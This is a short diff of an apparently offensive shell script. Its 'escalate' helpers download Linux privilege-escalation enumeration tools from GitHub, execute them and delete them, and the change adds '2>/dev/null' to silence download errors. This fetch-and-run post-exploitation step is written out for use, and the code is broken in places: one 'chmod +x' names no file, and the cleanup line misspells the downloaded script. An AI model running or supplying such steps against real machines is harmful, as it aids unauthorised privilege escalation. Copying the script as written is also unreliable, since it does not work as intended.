@@ -176,7 +176,7 @@ function escalate() {
 
 
 		function linprivesc(){
-				wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+				wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py 2>/dev/null
 				python linuxprivchecker.py
 				rm linuxprivchecker.py
 		
@@ -184,13 +184,13 @@ function escalate() {
 
 
 		function exploitsug(){
-				wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+				wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 2>/dev/null
 				chmod +x les.sh; ./les.sh; rm les.sh
 		}
 
 
 		function lineum(){
-				wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+				wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null
 				chmod +x; ./LinEnum.sh; rm LineEnum.sh
 		}
 
